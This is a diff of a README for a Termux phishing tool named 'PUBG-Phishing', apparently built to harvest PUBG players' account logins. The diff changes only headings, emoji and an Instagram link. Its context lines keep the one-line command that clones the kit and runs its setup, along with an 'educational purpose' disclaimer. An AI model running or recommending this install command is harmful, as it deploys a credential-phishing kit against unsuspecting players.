@@ -82,7 +82,8 @@ Now Type onlinehacking-pubg Run Tool
 $ rm -rf PUBG-Phishing && git clone https://github.com/OnlineHacKing/PUBG-Phishing.git && cd PUBG-Phishing && chmod +x * && ./setup 
 ```
 
-## SCREEN SHOTS [Termux]
+
+### 📸 SCREENSHOTS [Termux]
 
 <br>
 <p align="center">
@@ -92,13 +93,13 @@ $ rm -rf PUBG-Phishing && git clone https://github.com/OnlineHacKing/PUBG-Phishi
 <img src="https://i.ibb.co/0K2f8R2/IMG-20210302-214117.jpg" alt="IMG-20210302-214117" border="0">
 </p>
 
-## CONNECT WITH US :
+## 👨🏻‍💻 CONNECT WITH US :
 
-[![Instagram](https://img.shields.io/badge/INSTAGRAM-FOLLOW-red?style=for-the-badge&logo=instagram)](https://instagram.com/white_hat_278?igshid=175v9uifresgr)
+[![Instagram](https://img.shields.io/badge/INSTAGRAM-FOLLOW-red?style=for-the-badge&logo=instagram)](https://instagram.com/suman333mondal_?igshid=175v9uifresgr)
 
 
 
-# ■□■□■□■□■□■□ Warning □■□■□■□■□■□■
+# ■□■□■□■□■□■□ ⚠ Warning ⚠ □■□■□■□■□■□■
 
 ***This tool is only for educational purpose. If you use this tool for other purposes except education we will not be responsible in such cases.***
 
